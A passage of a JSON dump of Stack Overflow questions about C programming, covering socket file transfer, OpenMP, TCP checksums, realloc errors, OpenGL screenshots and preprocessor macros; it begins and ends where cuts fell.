perror(\"accept\"); exit(1);}\n\n        /* Find client's address */\n        if ((rem = gethostbyaddr((char *) &amp;client.sin_addr.s_addr,\n        sizeof (client.sin_addr.s_addr), client.sin_family)) == NULL) {\n        perror(\"gethostbyaddr\"); exit(1);}\n\n\ntemp=\"----Accepted connection from \";\nsprintf(temp_2,\"%s----\", rem -&gt; h_name);\nsprintf(message,\"%s:%s\\n\",temp,temp_2);\nlog_event(message,filename);\n\n/* Create child for serving the client */\nswitch (fork()) {\n\ncase -1:\nperror(\"fork\"); exit(1);\n\ncase 0: /* Child process */\n\n\n\ndo{\n\n    /* Receive message from client */\n    if ((recvMsgSize = recv(newsock,request,sizeof(request),0))&lt; 0)\n    perror(\"recv() failed\");\n\n\n\nprintf(\"%s\\n\",request);\n//printf(\"%s\\n\",command);\n\n/*IF YOU ARE GOING TO EXECUTE AN LS COMMAND*/\n\nif (strcmp(request,\"ls\")==0)\n    {\n        dp = opendir (\"./\");\n\n        if (dp != NULL)\n          { /*LOG LS REQUEST*/\n\n            temp=\"--Client \";\n            sprintf(temp_2,\"%s requested ls -------\",rem -&gt; h_name);\n            sprintf(message,\"%s:%s\\n\",temp,temp_2);\n            log_event(message,filename);\n\n            /*SEND ALL DIRECTORY LISTING*/    \n\n            while (ep = readdir (dp))\n            {\n                strcpy(list,ep-&gt;d_name);\n                //printf(\"sending:%s\\n\",list);\n                if (send(newsock,list,sizeof(list), 0)!= sizeof(list))\n                perror(\"send() sent a different number of bytes than expected\");\n            }\n            //IF DIRECORY IS FINISHED SEND A LAST MESSAGE FOR ENDING\n\n                (void) closedir (dp);\n            if (send(newsock,\"end\",sizeof(\"end\"), 0)!= sizeof(\"end\"))\n            perror(\"send() sent a different number of bytes than expected\");    \n        }       \n\n        else\n        perror (\"Couldn't open the directory\");\n\n    }\n\n/*IF THE COMMAND IS PUT*/\n\nif (strcmp(request,\"put\")==0) \n    {\n    sprintf(buf,\"\");\n    printf(\"execute put!!\\n\");\n        do{\n            ssize_t recvd;\n            while (bytesRemaining) {\n\n                if (( recvd =recv(newsock,p,bytesRemaining,0))&lt; 0){\n                perror(\"recv() failed\");}\n                bytesRemaining -= recvd;     // keep track of bytes left\n                p += recvd;             \n                    }\n          }while (buf==\"\");\n    strcat(copy,buf);\n\n    fp=fopen(copy,\"w+\");\n    count=0;\n\n    while (c!=\"\")\n    {\n        bzero(c,sizeof(c));\n        if ((recvMsgSize = recv(newsock,c,sizeof(c),0))&lt; 0)\n        perror(\"recv() failed\");\n        fprintf(fp,\"%s\",c);\n\n    }\n    fclose(fp);\n    printf(\"!!DONE!!!!\\n\");\n    //printf(\"%s\",request);\n\n    }\n\n}while (strcmp(request,\"end\")!=0); //run until client sents end request\n\n/*LOG EXIT OF CLIENT*/\n\ntemp=\"--Client\";\n    sprintf(temp_2,\"%s is disconnected---\",rem -&gt; h_name);\n    sprintf(message,\"%s:%s\\n\",temp,temp_2);\n    log_event(message,filename);\n\nclose(newsock); /* Close socket */\nexit(0);\n} /* end of switch */\n}/*end of while*/\n}\n</code></pre>\n\n<p>CLIENT</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;netdb.h&gt;\n#include &lt;netinet/in.h&gt;\n#include &lt;sys/socket.h&gt;\n#include &lt;sys/types.h&gt;\n\nint main (int argc,char *argv[])\n{\n\nint port, sock, serverlen,recvMsgSize,was_read;\nint fname_len,msg_len,request_len;\nchar buf[256];\nchar *fname;\nchar request[50];\nchar list[1024];\nchar msg[512];\nchar op[1000];\nchar temp[5];\nchar *temp3;\nchar read;\nFILE *fp;\nchar b[50];\n\nstruct sockaddr_in server;\nstruct sockaddr *serverptr;\nstruct hostent *rem;\n\ntemp3=\"put\";\n\n/* Are server's host name and port number given? */\nif (argc &lt; 3) {\nprintf(\"Please give host name and port number\\n\"); exit(1);\n\n}\n\n/* Create socket */\nif ((sock = socket(PF_INET, SOCK_STREAM, 0)) &lt; 0) {\nperror(\"socket\");\nexit(1);\n}\n\n/* Find server address */\nif ((rem = gethostbyname(argv[1])) == NULL) {\nherror(\"gethostbyname\"); exit(1);\n}\n\n/* Convert port number to integer */\nport = atoi(argv[2]);\n\n/* Internet domain */\nserver.sin_family = PF_INET; \nbcopy((char *) rem -&gt; h_addr, (char *) &amp;server.sin_addr,\nrem -&gt; h_length);\n\n/*Server's Internet address and port*/\nserver.sin_port = htons(port); \nserverptr = (struct sockaddr *) &amp;server;\nserverlen = sizeof(server);\n\n\nif (connect(sock, serverptr, serverlen) &lt; 0) { /* Request connection */\nperror(\"connect\"); \nexit(1); }\n\nprintf(\"Requested connection to host %s port %d\\n\", argv[1], port);\n\n\n\ndo{\n\nprintf(\"Please enter request\\n:\");\nscanf(\"%s\",request);\n\n/* Send the string to the server */\nif (send(sock,request,sizeof(request), 0)!= sizeof(request))\nperror(\"send() sent a different number of bytes than expected\");\n\nif(strcmp(request,\"ls\")==0)\n{\n    sprintf(list,\"\");\n\n    /*Recieve from server*/\n    while(strcmp(list,\"end\")!=0){\n\n        if ((recvMsgSize = recv(sock,list,sizeof(list),0))&lt; 0)\n        perror(\"recv() failed\");\n\n        if(strcmp(list,\"end\")!=0){\n        printf(\"%s\\n\",list);\n                    }\n                    }\nbzero(request,sizeof(request));\n}\n\n/*Command for put*/\nif(strcmp(request,\"put\")==0)\n{   bzero(request,sizeof(request));\n    bzero(list,sizeof(list));\n    printf(\"Please enter filename:\\n\");\n    scanf(\"%s\",list);\n    //printf(\"%s\",list);\n\n    if (send(sock,list,sizeof(list), 0)!= sizeof(list))\n    perror(\"send() sent a different number of bytes than expected\");\n\n    fp=fopen(list,\"r\");\n\n    if(fp==NULL)\n\n    {\n    puts ( \"Cannot open target file\" ) ;\n        fclose (fp) ;\n        exit(0);\n    }\n\n    while(!feof(fp))\n    {\n    bzero(b,sizeof(b));\n    int was_read = fread(b, sizeof(char),50,fp);\n\n    if (send(sock,b,(sizeof (char) * was_read), 0)!= (sizeof (char) * was_read))\n    perror(\"send() sent a different number of bytes than expected\");\n    }   \n\n    zero(b,sizeof(b));\n    if (send(sock,b,sizeof(b), 0)!= sizeof(b))\n    perror(\"send() sent a different number of bytes than expected\");\n\n}\n\n}while (strcmp(request,\"end\")!=0);\n\nclose(sock); /* Close socket */\nexit(0);\n}\n</code></pre>\n"},{"tags":["c"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":134,"score":0,"question_id":11904639,"title":"Switch case value with binary value?","body":"<p>I'm doing a switch case where the case values need to be in binary digits like <code>01,010,0100,0,00,000,</code> and so on.</p>\n\n<pre><code>switch(Code)\n{\n          case 0:\n               {\n                   printf(\"A\");\n                   break;\n                   }\n          case 00:\n               {\n                   printf(\"B\");\n                   break;\n                   }\n          case 000:\n               {\n                   printf(\"C\");\n                   break;\n}\n</code></pre>\n\n<p>I know that if I input 000, it it will be stored as 0. My question is how do you input 000 so that I can get <code>printf(\"C\")</code></p>\n"},{"tags":["c","batch","parallel-processing","cluster-computing","openmp"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13253855,"title":"Running OpenMP on a single node of a cluster","body":"<p>I am able to do simple for loops in OpenMP on my desktop/laptop of the form (a mild simplification of what I actually have...)</p>\n\n<pre><code> #include &lt;stdlib.h&gt;\n #include &lt;stdio.h&gt;\n #include &lt;omp.h&gt;\n %%%% #include other libraries...\n\n int main(void){\n .\n .\n .\n %%% declare and initialize variables.\n .\n .\n .\n\n #pragma omp parallel for collapse(3) shared(tf, p, Fx, Fy, Fz) private(v, i,j,k,t0) \n for (i = 0; i &lt; Nx; i++){\n for (j = 0; j &lt; Ny; j++){\n for (k = 0; k &lt; Nz; k++){\n\n v[0] = Fx[i][j][k]; \n v[1] = Fy[i][j][k];\n v[2] = Fz[i][j][k];\n ///My_fn changes v and then I put it back into Fx, Fy, Fz\n My_fn(v, t0, tf, p);   \n Fx[i][j][k] = v[0]; \n Fy[i][j][k] = v[1];\n Fz[i][j][k] = v[2];\n }\n }\n }\n }\n</code></pre>\n\n<p>If I want, I can even specify to use n_threasds = 1, 2, 3  or 4 cores on my laptop by adding <code>omp_set_num_threads(n_threads);</code> to the top, and I notice the performance I want.  However, when using a cluster, I comment that line out.</p>\n\n<p>I have access to a cluster and would like to run the code <strong>on a single node</strong> since the cluster has nodes with up to 48 cores and my laptop only 4.  When I use the cluster, after compiling, I type into the terminal</p>\n\n<pre><code> $export OMP_NUM_THREADS=10\n $bsub -n 10 ./a.out\n</code></pre>\n\n<p>But the program does not run properly: I output into a file and see it took 0 seconds to run, and the the values of Fx, Fy and Fz are what they are when I initiate them, so it seems the loop is not even run at all.</p>\n"},{"tags":["c","line","counter","loc"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1978,"score":0,"question_id":5275218,"title":"C Program to Count Lines of Code","body":"<p>I'm writing a simple LOC counter in C to count how many lines of code are in my C source files.  It's meant to be run from the command line, redirecting the target file as input and seeing a total line count printed to standard out. For example:</p>\n\n<pre><code>  counter.exe &lt; counter.c\n  15\n</code></pre>\n\n<p>So far the only rules I'm using are:</p>\n\n<ol>\n<li><p>Only count lines that have more than 3 characters (no blank lines or lines that only have a closing brace and semi-colon, etc).</p></li>\n<li><p>Don't count spaces as characters.</p></li>\n</ol>\n\n<p>Here's my program:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n\n    int input;\n    int linecount = 0;\n    int charcount = 0;\n\n    while ((input = getchar()) != EOF) {\n\n        if (input == ' ') {\n        }\n        else if (input == '\\n') {\n            if (charcount &gt; 3) {\n               linecount++;\n            }\n            charcount = 0;\n        }\n        else {\n            charcount++;\n        }\n    }\n\n    printf(\"%d\\n\", linecount);\n\n    return 0;\n}\n</code></pre>\n\n<p>My question is, can you offer some improvements to the rules to make this a more valid measure? Do people often count comments as valid lines of code? How about spaces or blank lines?</p>\n\n<p>I don't want to start a debate over the validity of LOC counts in general, it's something I've been asked in several interviews and I think is worth knowing, in a general sense, how many lines of code my own projects are. Thanks!</p>\n"},{"tags":["python","c","ruby","math","swap"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":5,"view_count":103,"score":-1,"question_id":13256099,"title":"How does this code swap the two numbers?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/1826159/swapping-two-variable-value-without-using-3rd-variable\">Swapping two variable value without using 3rd variable</a>  </p>\n</blockquote>\n\n\n\n<p>I came across this code on Quora.\nFor C:</p>\n\n<pre><code>a^=b^=a^=b;\n</code></pre>\n\n<p>For Ruby/Python:</p>\n\n<pre><code>a,b=b,a\n</code></pre>\n"},{"tags":["c","matlab","pointers","dll","shared-libraries"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":755,"score":3,"question_id":7445054,"title":"Passing pointer argument in MATLAB to a C-DLL function foo(char**)","body":"<p>I am writing a C-DLL to be called from MATLAB. \nIs it possible to call a function with <code>const char **</code> parameter? e.g.</p>\n\n<pre><code>void myGetVersion( const char ** );\n</code></pre>\n\n<p>The C code would be:</p>\n\n<pre><code>const char *version=0;\nmyGetVersion( &amp;version );\n</code></pre>\n\n<p>What would be corresponding MATLAB-Code (if it is possible at all)? </p>\n\n<p>Thank you very much!</p>\n\n<p>P.S.:\nI think <a href=\"http://www.mathworks.de/help/techdoc/matlab_external/f42387.html#f49895\" rel=\"nofollow\">this is the help page</a>, but I couldn't find my case :-(</p>\n"},{"tags":["c","pointers"],"answer_count":7,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":65,"score":2,"question_id":13255846,"title":"copy string in c using pointer","body":"<p>Code copy string in C</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nchar *copyString(char *,char *);\nvoid main()\n{\n    char *first = (char *)calloc(sizeof(char),10);\n    char *second = (char *)calloc(sizeof(char),10);\n    printf(\"Enter first string:\\t\");\n    scanf(\"%s\",first);\n    printf(\"%s\",copyString(first,second));\n}\nchar *copyString(char *a,char *b)\n{\nint i=0;\nwhile(*(a+i)!='\\0')\n{\n*(b+i)=*(a+i);\ni++;\n}\n*(b+i)='\\0';\nreturn b;\n}\n</code></pre>\n\n<p><strong><code>Case 1:</code></strong></p>\n\n<hr>\n\n<p><strong>Input :</strong> Hello</p>\n\n<p><strong>Output :</strong> Hello</p>\n\n<p><strong><code>Case 2:</code></strong></p>\n\n<hr>\n\n<p><strong>Input :</strong> Hello World</p>\n\n<p><strong>Output :</strong> Hello</p>\n\n<p>So, my question is whether <code>space</code> is considered as <code>newline/null</code> ?? Because, in second case, it shows like this.. </p>\n"},{"tags":["c","tcp","network-programming","ip","freebsd"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":73,"score":3,"question_id":13211516,"title":"Is there anythign wrong with this checksum calculation?","body":"<p>from this site: <a href=\"http://www.enderunix.org/docs/en/rawipspoof/\" rel=\"nofollow\">http://www.enderunix.org/docs/en/rawipspoof/</a></p>\n\n<p>I pulled the following functions</p>\n\n<pre><code>unsigned short in_cksum(unsigned short *addr, int len)\n{\n    int nleft = len;\n    int sum = 0;\n    unsigned short *w = addr;\n    unsigned short answer = 0;\n\n    while (nleft &gt; 1) {\n        sum += *w++;\n        nleft -= 2;\n    }\n\n    if (nleft == 1) {\n        *(unsigned char *) (&amp;answer) = *(unsigned char *) w;\n        sum += answer;\n    }\n\n    sum = (sum &gt;&gt; 16) + (sum &amp; 0xFFFF);\n    sum += (sum &gt;&gt; 16);\n    answer = ~sum;\n    return (answer);\n}\n\nunsigned short in_cksum_tcp(int src, int dst, unsigned short *addr, int len)\n{\n    struct psd_tcp buf;\n    u_short ans;\n\n    memset(&amp;buf, 0, sizeof(buf));\n    buf.src.s_addr = src;\n    buf.dst.s_addr = dst;\n    buf.pad = 0;\n    buf.proto = IPPROTO_TCP;\n    buf.tcp_len = htons(len);\n    memcpy(&amp;(buf.tcp), addr, len);\n    ans = in_cksum((unsigned short *)&amp;buf, 12 + len);\n    return (ans);\n}\n</code></pre>\n\n<p>However, when I run this against incoming TCP packets that I am seeing, I do not get the same checksum result as they currently have ( I save the incoming TCP checksum and set the one on the packet to zero before trying to run the checksum function)</p>\n\n<p>Now, when I run \"in_cksum\" against the IP header, I get the right answer. </p>\n\n<p>Here is the TCP psuedo header from that site:</p>\n\n<pre><code>struct psd_tcp {\n    struct in_addr src;\n    struct in_addr dst;\n    unsigned char pad;\n    unsigned char proto;\n    unsigned short tcp_len;\n    struct tcphdr tcp;\n};\n</code></pre>\n\n<p>Is it missing something to make this work?</p>\n"},{"tags":["c","arrays","string","pointers","global"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":1,"view_count":62,"score":3,"question_id":12952534,"title":"defining a global struct pointer in C?","body":"<p>I need to identify a global struct (array), consisted of 4 integers.\nThe problem is, size of that struct array is not known in advance. </p>\n\n<p>I'm trying to make sth. like this:</p>\n\n<pre><code>typedef struct\n{\n    int value;\n    int MAXleft;\n    int MAXright;\n    int MAX;\n} strnum;\n\nint main ()\n{\n    int size;\n    scanf(\"%d\", &amp;size);\n\n    strnum numbers[size];\n\n    return 0;\n}\n</code></pre>\n\n<p>I heard that, it is possible to do this by pointers but I don't know how to do. </p>\n"},{"tags":["c","sockets","serialization"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13254428,"title":"Trouble with packing and sending binary data over socket -Serialization","body":"<p>I have for several hours tried, debugged and cried in hope to get my program to send/pack and receive/unpack my data correctly. My only hope is some good help!</p>\n\n<p>To pack/unpack data i have implemented <em>Beej's Guide to Network Programming</em> <a href=\"http://beej.us/guide/bgnet/examples/pack2.c\" rel=\"nofollow\">example pack2.c</a> </p>\n\n<p>The code works pack/unpack works internally in the same program. But when i try to send the packed data over a socket to another program on the same computer, it will not work! My thoughts is that the recv() and send() functions in a way maybe makes the data corrupt or something like this, i have tried to debug this is several ways:</p>\n\n<p><strong>I need some help to get this working, i believe that the problem lays in the way buf is sent and received, since the pack()/unpack() functions work internally in a program.</strong></p>\n\n<p><em><strong>Thanks</em></strong></p>\n\n<p><strong>Client side:</strong></p>\n\n<pre><code>unsigned char buf[1024];\n\n    int16_t packetsize = pack(buf, \"h\", (int16_t)37);\n    packi16(buf+1, packetsize);\n    int len = packetsize;\n\n    uint16_t header = htons(packetsize); //Convert from host -&gt; network\n\n    //Sends info to receiver about next pack coming.\n\n    printf(\"HEADER SIZE %d\\n\", packetsize);\n\n    if(send(sock, &amp;header, packetsize, 0) == -1) {\n        perror(\"sendall\");\n    }\n\n\n    /*==========SEND PACKAGE======================*/\n\n    int bytessendt = send(sock, buf, len, 0);//server_send_all(sock, buf, &amp;len);\n\n    if(bytessendt == -1) {\n        perror(\"sendall\");\n    }\n\n    printf(\"BYTES SENT OVER SOCKET: %d \\n\", bytessendt);\n\n\n    close(sock);\n</code></pre>\n\n<p><strong>Server side:</strong></p>\n\n<pre><code>                uint16_t buf;\n                int len = sizeof(buf);\n\n                if(recv(i, &amp;buf, len, 0) == -1) {\n                    printf(\"****Error when receiving\");\n                }\n\n                int header = ntohs(buf);\n\n                printf(\"HEADER SIZE: %d\\n\", header);\n\n                /*========REICIVE PACK AND UNPACK================*/\n\n                unsigned char buf2[1024];\n        int16_t monkeycount;\n\n                int bytesreaded = recv(i, buf2, header, 0);\n\n                if(bytesreaded == -1) {\n                    printf(\"Feil ved mottakelse\\n\");\n                }\n\n                printf(\"BYTES READED: %d\\n\", bytesreaded);\n                printf(\"BYTES SHOULD BE READED: %d\\n\", header);\n\n                unpack(buf2, \"h\", &amp;monkeycount);\n\n\n                printf(\"CONTENT: %d\\n\", monkeycount);\n\n\n                close(i);\n\nint server_send_all(int socket, unsigned char *buf, int *len) {\n\n    int total = 0;              //Total amout of data to send\n    int bytesleft = *len;       //Amount of data left to send\n    int n;                      //Holds return from send()\n\n    printf(\"SOCKET -DATA TO SEND: %d\\n\", *len);\n\n    while(total &lt; *len) {\n        n = send(socket, buf+total, bytesleft, 0);\n\n        if(n == -1) { //send() returns error\n            break;\n        }\n\n        total += n;\n        bytesleft -= n;\n    }\n\n    *len = total; //Returns actually sent\n\n    return n == -1?-1:0;\n}\n</code></pre>\n\n<p><strong>Sending string</strong></p>\n\n<p><em>From client:</em></p>\n\n<pre><code>int packetsize = 0;\npacketsize += pack(buf + packetsize, \"h\", (int16_t)37);\npacketsize += pack(buf + packetsize, \"s\", \"Hello World\");\n\n    send(sock, &amp;header, packetsize, 0) \n</code></pre>\n\n<p><em>To server:</em></p>\n\n<pre><code>     char s2[30];\n                        unpack(buf2, \"h30s\", &amp;monkeycount, s2);                  \n\n                        printf(\"CONTENT: %d %s\\n\", monkeycount, s2);\n</code></pre>\n\n<p><strong>Gives output</strong></p>\n\n<p>CONTENT: 37 Hello Wor</p>\n"},{"tags":["c","loops","eof","infinite","fgetc"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":13250143,"title":"C fgetc() on socket/file stream while checking for EOF goes into infinite loop","body":"<pre><code>int main(int argc, char *argv[]) {\n\n    int conn_s = socket(AF_INET, SOCK_STREAM, 0);\n    struct addrinfo hints;\n    hints.ai_family = AF_INET;\n    hints.ai_socktype = SOCK_STREAM;\n    hints.ai_protocol = 0;\n\n    struct addrinfo *addr = (struct addrinfo *) calloc(1, sizeof(struct addrinfo));\n\n    getaddrinfo(\"google.com\", \"80\", &amp;hints, &amp;addr);\n\n    connect(conn_s, addr-&gt;ai_addr, sizeof(struct sockaddr_in));\n\n    char *http_request = \"GET / HTTP/1.1\\n\\n\";\n\n    send(conn_s, http_request, strlen(http_request), 0);\n    FILE *sockfile = (FILE *) fdopen(conn_s, \"r\");\n    FILE *fp = fopen(\"/Users/leekaiwei/Desktop/results.html\", \"w+\");\n    int ch;\n\n    while ((ch = fgetc(sockfile)) != EOF) {\n        fprintf(fp, \"%c\", ch);\n    }\n\n    close(conn_s);\n    fclose(fp);\n    fclose(sockfile);\n    free(addr);\n    return 0;\n}\n</code></pre>\n\n<p>The while loop never ends. Why is this? I have done this with a local file and it works fine. It also works fine with a for loop, it's just that the fgetc() never returns EOF.</p>\n"},{"tags":["c","algorithm","project-euler"],"answer_count":6,"favorite_count":0,"up_vote_count":7,"down_vote_count":0,"view_count":3448,"score":7,"question_id":2643260,"title":"Project Euler Question 14 (Collatz Problem)","body":"<p>The following iterative sequence is defined for the set of positive integers:</p>\n\n<p>n ->n/2 (n is even)\nn ->3n + 1 (n is odd)</p>\n\n<p>Using the rule above and starting with 13, we generate the following sequence:</p>\n\n<p>13  40  20  10  5  16  8  4  2  1\nIt can be seen that this sequence (starting at 13 and finishing at 1) contains 10 terms. Although it has not been proved yet (Collatz Problem), it is thought that all starting numbers finish at 1.</p>\n\n<p>Which starting number, under one million, produces the longest chain?</p>\n\n<p>NOTE: Once the chain starts the terms are allowed to go above one million.</p>\n\n<p>I tried coding a solution to this in C using the bruteforce method. However, it seems that my program stalls when trying to calculate 113383. Please advise :)</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#define LIMIT 1000000\n\nint iteration(int value)\n{\n if(value%2==0)\n  return (value/2);\n else\n  return (3*value+1);\n}\n\nint count_iterations(int value)\n{\n int count=1;\n //printf(\"%d\\n\", value);\n while(value!=1)\n {\n  value=iteration(value);\n  //printf(\"%d\\n\", value);\n  count++;\n }\n return count;\n}\n\nint main()\n{\n int iteration_count=0, max=0;\n int i,count;\n\n\n for (i=1; i&lt;LIMIT; i++)\n {\n  printf(\"Current iteration : %d\\n\", i);\n  iteration_count=count_iterations(i);\n  if (iteration_count&gt;max)\n   {\n   max=iteration_count;\n   count=i;\n   }\n\n }\n\n //iteration_count=count_iterations(113383); \n printf(\"Count = %d\\ni = %d\\n\",max,count);\n\n}\n</code></pre>\n"},{"tags":["c","linux","http","browser","npapi"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13233756,"title":"How to get http response header in npapi plugin","body":"<p>i am new to plugin development. I was told to use Firebreath, for developing npapi plugins, and it turned out to be very easy. Now, i wish to access the http response header of the response passed on to plugin. But i couldn't figure out a way as their is scarce doc available for firebreath. In NPAPI tutorials, they use npstream, but i can't figure out how to use this structure in firebreath. Any help will be highly appreciated.</p>\n"},{"tags":["c","pointers","malloc","realloc"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":69,"score":1,"question_id":13254859,"title":"pointer being realloc'd was not allocated","body":"<pre><code>#include &lt;stdio.h&gt;\n#include \"stdlib.h\"\n\nint main(int argc, const char * argv[])\n{\n    int i,j;\n    char takimlar[4][8]= { \"TAKIM A \",\"TAKIM B\",\"TAKIM C\",\"TAKIM D\"};\n    char *var = malloc(sizeof(char)*1);\n    int sonuclar[4][4] = {\n        {0,3,4,2},\n        {1,2,3,1},\n        {2,3,2,3},\n        {0,2,1,4}\n    };\n\n    for (i=0; i&lt;4; i++) {\n        if (sonuclar[i][2]&gt;sonuclar[i][3]) {\n            var = realloc(var,8);\n            for (j=0; j&lt;8; j++) {\n                var += takimlar[i][0];\n            }\n        }\n        else if(sonuclar[i][2]&lt;sonuclar[i][3]){\n            var = realloc(var,8);\n            for (j=0; j&lt;8; j++) {\n                var += takimlar[i][1];\n            }\n        }\n    }\n    printf(\"%s\",var);\n\n    return 0;\n}\n</code></pre>\n\n<p>I want to dynamic allocate in memory for a variable and then I want to allocate more memory using realloc function. When I run this program I got this error:</p>\n\n<blockquote>\n  <p>error for object 0x100100c17: pointer being realloc'd was not allocated.\n   set a breakpoint in malloc_error_break to debug</p>\n</blockquote>\n\n<p>when I had a look in <em><code>malloc.c</code></em> file I saw these lines:</p>\n\n<pre><code>zone = find_registered_zone(old_ptr, &amp;old_size);\n    if (!zone) {\n        malloc_printf(\"error for object %p: pointer being realloc'd was not allocated.\\n\"\n        \"set a breakpoint in malloc_error_break to debug\\n\", old_ptr);\n        malloc_error_break();\n</code></pre>\n\n<p>what am I doing wrong?</p>\n"},{"tags":["c","arrays"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":13253600,"title":"intersection and union of n-arrays in C","body":"<p>I have those functions which are making intersection/union but just of two arrays.\nI need too improve them to work with n-arrays: arr = {{1,2,3},{1,5,6},...,{1,9}}.<br>\nThe arrays are sorted , and their elements are unique among them.<br>\nExample (intersection):<br>\nInput: {{1,2,3,4},{2,5,4},{4,7,8}}<br>\nOutput: {4}</p>\n\n<p>arr1[],arr2 - arrays<br>\nm,n - length of the arrays\nIntersection function:  </p>\n\n<pre><code>int printIntersection(int arr1[], int arr2[], int m, int n)\n{\n  int i = 0, j = 0;\n  while(i &lt; m &amp;&amp; j &lt; n)\n  {\n    if(arr1[i] &lt; arr2[j])\n      i++;\n    else if(arr2[j] &lt; arr1[i])\n      j++;\n    else /* if arr1[i] == arr2[j] */\n    {\n      printf(\" %d \", arr2[j++]);\n      i++;\n    }\n  }\n}\n</code></pre>\n\n<p>and union function:</p>\n\n<pre><code>int printUnion(int arr1[], int arr2[], int m, int n)\n{\n  int i = 0, j = 0;\n  while(i &lt; m &amp;&amp; j &lt; n)\n  {\n    if(arr1[i] &lt; arr2[j])\n      printf(\" %d \", arr1[i++]);\n    else if(arr2[j] &lt; arr1[i])\n      printf(\" %d \", arr2[j++]);\n    else\n    {\n      printf(\" %d \", arr2[j++]);\n      i++;\n    }\n  }\n\n  while(i &lt; m)\n   printf(\" %d \", arr1[i++]);\n  while(j &lt; n)\n   printf(\" %d \", arr2[j++]);\n}\n</code></pre>\n"},{"tags":["iphone","objective-c","c","opengl-es","glreadpixels"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13254462,"title":"glReadPixels not working on iPhone","body":"<p>I'm trying to take a screenshot of a GLView on the iPhone.  I wrote the following code:</p>\n\n<pre><code>[self setContext];\n\nGLint backWidth, backHeight;\n\nglGetRenderbufferParameterivOES( GL_RENDERBUFFER_OES, GL_RENDERBUFFER_WIDTH_OES, &amp;backWidth );\nglGetRenderbufferParameterivOES( GL_RENDERBUFFER_OES, GL_RENDERBUFFER_HEIGHT_OES, &amp;backHeight );\n\nint         dataLength  = backWidth * backHeight * 4;\nuint32_t*   pData       = (uint32_t*)malloc( dataLength * sizeof( char ) );\nmemset( pData, 0xff, dataLength ); // This is here to confirm some writing occurs in glReadPixels\n\n// Read pixel data from the framebuffer\n//glPixelStorei( GL_PACK_ALIGNMENT, 4 );\nglReadPixels( 0, 0, backWidth, backHeight, GL_RGBA, GL_UNSIGNED_BYTE, pData );\nfprintf( stderr, \"%d\\n\", glGetError() );\n\nCGDataProviderRef   cgDataProvider  = CGDataProviderCreateWithData( NULL, pData, dataLength, DataProviderReleaseDataCallback );\nCGColorSpaceRef     cgColorSpace    = CGColorSpaceCreateDeviceRGB();\nCGImageRef          cgImage         = CGImageCreate(    backWidth, backHeight, 8, 32, backWidth * 4, cgColorSpace, kCGBitmapByteOrder32Big | kCGImageAlphaPremultipliedLast,\n                                                        cgDataProvider, NULL, true, kCGRenderingIntentDefault );\n\n//NSData*       pNSData         = [[NSData alloc] initWithBytes: pData length: dataLength];\nUIImage*    pRetImage       = [UIImage imageWithCGImage: cgImage scale: 1.0f orientation: UIImageOrientationDownMirrored];\nCFRelease( cgDataProvider );\nCFRelease( cgColorSpace );\nCGImageRelease( cgImage );\n//free( pData );\n\nreturn pRetImage;\n</code></pre>\n\n<p>Which works perfectly in the simulator.  Unfortunately the moment I tried to run it on the iPhone 4S glReadPixels does nothing.  I deliberately memset the array to 0xff to see if I could see if it was doing anything and it doesn't matter what I set the array too glReadPixels does nothing.  It also reports no errors.</p>\n\n<p>I'm not using a multisample buffer unless the iPhone does the set up for me.</p>\n\n<pre><code>glGenRenderbuffers( 1, &amp;mGlRenderBuffer );\nglBindRenderbuffer( GL_RENDERBUFFER, mGlRenderBuffer );\n\n[mGlContext renderbufferStorage: GL_RENDERBUFFER fromDrawable: mGlLayer];\n\nGLuint frameBuffer;\nglGenFramebuffers( 1, &amp;frameBuffer );\nglBindFramebuffer( GL_FRAMEBUFFER, frameBuffer );\nglFramebufferRenderbuffer( GL_FRAMEBUFFER, GL_COLOR_ATTACHMENT0, GL_RENDERBUFFER, mGlRenderBuffer );\n</code></pre>\n\n<p>Has anyone any ideas whats going on?  Its driving me mad :(</p>\n"},{"tags":["c","preprocessor","c-preprocessor"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":64,"score":3,"question_id":13254264,"title":"C macro, wrong argument number returned","body":"<p>I have following macros:</p>\n\n<pre><code>#define CONCATENATE(arg1, arg2)  arg1##arg2\n\n#define FOR_EACH_1(what, x, ...) what(x)\n#define FOR_EACH_2(what, x, ...) what(x) FOR_EACH_1(what, __VA_ARGS__)\n#define FOR_EACH_3(what, x, ...) what(x) FOR_EACH_2(what, __VA_ARGS__)\n#define FOR_EACH_4(what, x, ...) what(x) FOR_EACH_3(what, __VA_ARGS__)\n#define FOR_EACH_5(what, x, ...) what(x) FOR_EACH_4(what, __VA_ARGS__)\n#define FOR_EACH_6(what, x, ...) what(x) FOR_EACH_5(what, __VA_ARGS__)\n#define FOR_EACH_7(what, x, ...) what(x) FOR_EACH_6(what, __VA_ARGS__)\n#define FOR_EACH_8(what, x, ...) what(x) FOR_EACH_7(what, __VA_ARGS__)\n\n#define FOR_EACH_NARG(...) FOR_EACH_NARG_(__VA_ARGS__, FOR_EACH_RSEQ_N())\n#define 